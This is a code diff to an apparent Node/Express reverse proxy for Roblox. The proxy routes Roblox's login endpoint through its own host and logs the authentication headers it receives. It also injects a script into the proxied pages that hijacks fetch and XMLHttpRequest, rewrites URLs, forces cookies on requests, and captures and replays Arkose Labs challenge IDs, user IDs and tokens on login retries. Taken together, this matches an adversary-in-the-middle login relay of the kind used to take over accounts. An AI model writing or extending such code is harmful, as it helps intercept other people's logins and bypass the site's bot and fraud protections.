@@ -250,13 +250,32 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     const hasChallengeSolution = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
     const hasChallengeId = req.headers['rblx-challenge-id'];
     console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
+    
+    // Debug: Log all incoming headers for login requests
+    console.log('   All incoming headers:');
+    for (const [k, v] of Object.entries(req.headers)) {
+        if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx') || k.includes('rblx')) {
+            console.log(`     ${k}: ${typeof v === 'string' ? v.substring(0, 100) : v}`);
+        }
+    }
+    
+    // Try to decode challenge metadata for debugging
+    if (req.headers['rblx-challenge-metadata']) {
+        try {
+            const decoded = Buffer.from(req.headers['rblx-challenge-metadata'], 'base64').toString('utf8');
+            const meta = JSON.parse(decoded);
+            console.log('   Decoded challenge metadata:', meta);
+        } catch(e) {
+            console.log('   Failed to decode challenge metadata:', e.message);
+        }
+    }
 
     const challengeHeaders = {};
     for (const h of CHALLENGE_HEADERS) {
         if (req.headers[h]) challengeHeaders[h] = req.headers[h].substring(0, 50) + '...';
     }
     if (Object.keys(challengeHeaders).length > 0) {
-        console.log('   Challenge headers received:', challengeHeaders);
+        console.log('   Challenge headers summary:', challengeHeaders);
     }
 
     try {
@@ -449,45 +468,95 @@ function buildInjectedScript(host) {
         return url;
     }
 
-    window.__rblxChallengeId = null;
-    window.__rblxChallengeType = null;
-    window.__rblxUserId = null;
-    window.__rblxBrowserTrackerId = null;
-    window.__rblxChallengeSolved = false;
+    // Load challenge state from sessionStorage (survives page reloads)
+    window.__rblxChallengeId = sessionStorage.getItem('__rblxChallengeId') || null;
+    window.__rblxChallengeType = sessionStorage.getItem('__rblxChallengeType') || null;
+    window.__rblxUserId = sessionStorage.getItem('__rblxUserId') || null;
+    window.__rblxBrowserTrackerId = sessionStorage.getItem('__rblxBrowserTrackerId') || null;
+    window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
+    
+    if (window.__rblxChallengeId) {
+        log('Restored challenge state from sessionStorage', {
+            id: window.__rblxChallengeId, 
+            solved: window.__rblxChallengeSolved
+        });
+    }
 
     function log(msg, data) {
         console.log('[Proxy]', msg, data || '');
     }
+    
+    function saveChallengeState() {
+        if (window.__rblxChallengeId) sessionStorage.setItem('__rblxChallengeId', window.__rblxChallengeId);
+        if (window.__rblxChallengeType) sessionStorage.setItem('__rblxChallengeType', window.__rblxChallengeType);
+        if (window.__rblxUserId) sessionStorage.setItem('__rblxUserId', window.__rblxUserId);
+        if (window.__rblxBrowserTrackerId) sessionStorage.setItem('__rblxBrowserTrackerId', window.__rblxBrowserTrackerId);
+        sessionStorage.setItem('__rblxChallengeSolved', window.__rblxChallengeSolved ? 'true' : 'false');
+    }
 
     function constructSolutionMetadata() {
-        if (!window.__rblxChallengeId || !window.__rblxUserId) return null;
+        if (!window.__rblxChallengeId || !window.__rblxUserId) {
+            log('Cannot construct metadata - missing challengeId or userId', {
+                challengeId: window.__rblxChallengeId, 
+                userId: window.__rblxUserId
+            });
+            return null;
+        }
         var data = {
             userId: window.__rblxUserId,
             challengeId: window.__rblxChallengeId,
             browserTrackerId: window.__rblxBrowserTrackerId || ''
         };
-        return btoa(JSON.stringify(data));
+        var encoded = btoa(JSON.stringify(data));
+        log('Constructed solution metadata', {data: data, encoded: encoded.substring(0, 50) + '...'});
+        return encoded;
     }
+    
+    // Debug: Log challenge state periodically
+    setInterval(function() {
+        if (window.__rblxChallengeId) {
+            log('Challenge state', {
+                id: window.__rblxChallengeId, 
+                type: window.__rblxChallengeType, 
+                solved: window.__rblxChallengeSolved
+            });
+        }
+    }, 5000);
 
     var _fetch = window.fetch;
     window.fetch = function(resource, init) {
         var url = typeof resource === 'string' ? resource : resource.url;
         var rewrittenUrl = rewriteUrl(url);
-        if (typeof resource === 'string') resource = rewrittenUrl;
-        else if (resource && resource.url) resource = new Request(rewrittenUrl, resource);
+        
         init = init || {};
         init.credentials = 'include';
 
+        // Add challenge headers BEFORE processing the resource
         if (window.__rblxChallengeSolved && window.__rblxChallengeId) {
             var solutionMetadata = constructSolutionMetadata();
             if (solutionMetadata && (url.includes('/v2/login') || url.includes('auth'))) {
                 init.headers = init.headers || {};
+                // If resource is a Request, we need to copy its headers first
+                if (typeof resource !== 'string' && resource.headers) {
+                    resource.headers.forEach(function(value, key) {
+                        if (!init.headers[key]) init.headers[key] = value;
+                    });
+                }
                 init.headers['rblx-challenge-id'] = window.__rblxChallengeId;
                 init.headers['rblx-challenge-type'] = window.__rblxChallengeType || 'chef';
                 init.headers['rblx-challenge-metadata'] = solutionMetadata;
                 init.headers['x-retry-attempt'] = '1';
-                log('Adding challenge solution headers to retry', {id: window.__rblxChallengeId});
+                log('Adding challenge solution headers to retry', {id: window.__rblxChallengeId, url: rewrittenUrl});
             }
+        }
+        
+        // Now create the resource with merged headers
+        if (typeof resource === 'string') {
+            resource = rewrittenUrl;
+        } else if (resource && resource.url) {
+            resource = new Request(rewrittenUrl, init);
+            // Clear init since we already applied it to the Request
+            init = undefined;
         }
 
         return _fetch.call(this, resource, init).then(function(response) {
@@ -508,12 +577,27 @@ function buildInjectedScript(host) {
                     window.__rblxUserId = meta.userId;
                     window.__rblxBrowserTrackerId = meta.browserTrackerId;
                     log('Extracted from metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId});
-                } catch(e) {}
+                } catch(e) {
+                    log('Failed to parse challenge metadata:', e.message);
+                }
+                saveChallengeState();
             }
 
             if (url.includes('challenge/v1/continue') && response.status === 200) {
                 log('Challenge continue succeeded, marking as solved');
                 window.__rblxChallengeSolved = true;
+                saveChallengeState();
+                // Also store the challenge solution from the response if available
+                clonedResponse.text().then(function(text) {
+                    try {
+                        var data = JSON.parse(text);
+                        if (data.challengeToken) {
+                            window.__rblxChallengeToken = data.challengeToken;
+                            sessionStorage.setItem('__rblxChallengeToken', data.challengeToken);
+                            log('Stored challenge token from continue response');
+                        }
+                    } catch(e) {}
+                }).catch(function() {});
             }
 
             return response;
@@ -539,15 +623,18 @@ function buildInjectedScript(host) {
     XMLHttpRequest.prototype.send = function(body) {
         this.withCredentials = true;
 
+        // Always add challenge headers if challenge is solved and this is a login request
         if (window.__rblxChallengeSolved && window.__rblxChallengeId) {
             var solutionMetadata = constructSolutionMetadata();
-            if (solutionMetadata && this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('auth'))) {
-                if (!this.__rblxHeaders || !this.__rblxHeaders['rblx-challenge-metadata']) {
+            var isLoginUrl = this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('/auth-api/v2/login'));
+            if (solutionMetadata && isLoginUrl) {
+                var hasChallengeHeader = this.__rblxHeaders && this.__rblxHeaders['rblx-challenge-metadata'];
+                if (!hasChallengeHeader) {
                     _setRequestHeader.call(this, 'rblx-challenge-id', window.__rblxChallengeId);
                     _setRequestHeader.call(this, 'rblx-challenge-type', window.__rblxChallengeType || 'chef');
                     _setRequestHeader.call(this, 'rblx-challenge-metadata', solutionMetadata);
                     _setRequestHeader.call(this, 'x-retry-attempt', '1');
-                    log('Adding challenge solution headers to XHR retry', {id: window.__rblxChallengeId});
+                    log('XHR: Added challenge headers to login', {id: window.__rblxChallengeId, url: this.__rblxUrl});
                 }
             }
         }
@@ -570,10 +657,12 @@ function buildInjectedScript(host) {
                         window.__rblxUserId = meta.userId;
                         window.__rblxBrowserTrackerId = meta.browserTrackerId;
                     } catch(e) {}
+                    saveChallengeState();
                 }
                 if (self.__rblxUrl && self.__rblxUrl.includes('challenge/v1/continue') && self.status === 200) {
                     log('XHR Challenge continue succeeded, marking as solved');
                     window.__rblxChallengeSolved = true;
+                    saveChallengeState();
                 }
             }
             if (originalOnReadyStateChange) return originalOnReadyStateChange.apply(this, arguments);
@@ -614,8 +703,38 @@ function buildInjectedScript(host) {
         }
         return element;
     };
+    
+    // Helper to clear challenge state after successful login
+    window.clearRblxChallengeState = function() {
+        window.__rblxChallengeId = null;
+        window.__rblxChallengeType = null;
+        window.__rblxUserId = null;
+        window.__rblxBrowserTrackerId = null;
+        window.__rblxChallengeSolved = false;
+        window.__rblxChallengeToken = null;
+        sessionStorage.removeItem('__rblxChallengeId');
+        sessionStorage.removeItem('__rblxChallengeType');
+        sessionStorage.removeItem('__rblxUserId');
+        sessionStorage.removeItem('__rblxBrowserTrackerId');
+        sessionStorage.removeItem('__rblxChallengeSolved');
+        sessionStorage.removeItem('__rblxChallengeToken');
+        log('Challenge state cleared');
+    };
+    
+    // Expose challenge state for debugging
+    window.getRblxChallengeState = function() {
+        return {
+            challengeId: window.__rblxChallengeId,
+            challengeType: window.__rblxChallengeType,
+            userId: window.__rblxUserId,
+            browserTrackerId: window.__rblxBrowserTrackerId,
+            challengeSolved: window.__rblxChallengeSolved,
+            challengeToken: window.__rblxChallengeToken
+        };
+    };
 
     log('Proxy interceptor loaded with Arkose Labs support');
+    log('Challenge state:', window.getRblxChallengeState());
 })();
 </script>`;
 }
